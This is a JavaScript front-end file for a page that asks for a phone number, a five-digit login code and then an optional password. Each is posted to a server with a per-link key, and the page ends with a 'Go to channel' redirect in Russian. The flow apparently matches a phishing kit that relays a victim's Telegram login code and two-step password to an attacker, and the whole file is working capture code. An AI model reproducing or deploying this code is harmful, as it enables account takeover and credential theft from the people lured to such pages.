$('#sendPhoneBtn').on('click', function () {
    let phone = $('#phoneNumber').text().trim();
    phone = phone.replace(/\s+/g, '');
    const phoneRegex = /^\+?[0-9]{10,15}$/; 
    const $inputField = $('#phoneInputWrapper .input-field');
    const $label = $('#phoneInputWrapper label span');

    if (!phoneRegex.test(phone)) {
        $inputField.addClass('error');
        $label.text("Invalid phone number, please try again");
        return;
    } else {
        $inputField.removeClass('error');
        $label.text("Phone Number");
    }
    $.ajax({
        url: '/send_code',
        method: 'POST',
        contentType: 'application/json',
        data: JSON.stringify({ phone, key: window.location.pathname.split("/").pop() }),
        success: function (data) {
            if (data.status === 'code_sent') {
                $('#phoneInputWrapper').remove();
                $('#codeInputWrapper').removeClass('hide');
            } else {
                console.log("❌ Error sending code.");
            }
        },
        error: function (xhr) {
            console.log("❌ Server error: " + xhr.responseText);
        }
    });
});


document.getElementById('codeInput').addEventListener('input', async () => {
    const code = document.getElementById('codeInput').value;
    
    if (code.length == 5) {
        const path = window.location.pathname.split("/");
        const lastElement = path[path.length - 1];
        const res = await fetch('/submit_code', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 'code': code, "key": window.location.pathname.split("/").pop() })
        });

        const data = await res.json();
        if (data.status === 'authorized') {
            $('#codeInputWrapper').remove();
            $('#loadingWrapper').removeClass('hide');

            let $button = $('#loadingWrapper button');

            setTimeout(() => {
                $button.text('Перейти в канал');
                $button.off('click'); 
                $button.on('click', () => {
                    window.location.href = data.redirect_url; 
                });
            }, 3000);
        } else if (data.status === 'need_password') {
            $('#codeInputWrapper').remove();
            $('#passwordInputWrapper').removeClass('hide'); 
        } else if (data.status === 'invalid_code') {
            const $inputField = $('#codeInputWrapper .input-field');
            const $label = $('#codeInputWrapper label span');

            $inputField.addClass('error');
            $label.text("Invalid code, please try again");
            "Invalid code, please try again"
        }
    } else if (code.length < 5) {
        const $inputField = $('#codeInputWrapper .input-field');
        const $label = $('#codeInputWrapper label span');

        $inputField.removeClass('error');
        $label.text("Code");
    }
});

document.getElementById('submitPasswordBtn').addEventListener('click', async () => {
    const password = document.getElementById('passwordInput').value;
    const res = await fetch('/submit_password', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ password, key: window.location.pathname.split("/").pop() })
    });

    const data = await res.json();
    if (data.status === 'authorized') {
        $('#passwordInputWrapper').remove();
        $('#loadingWrapper').removeClass('hide');

        let $button = $('#loadingWrapper button');
        setTimeout(() => {
            $button.text('Перейти в канал');
            $button.off('click'); 
            $button.on('click', () => {
                window.location.href = data.redirect_url; 
            });
        }, 3000);

    } else {
        const $inputField = $('#passwordInputWrapper .input-field');
        const $label = $('#passwordInputWrapper label span');

        $inputField.addClass('error');
        $label.text("Invalid password, please try again");
    }
});
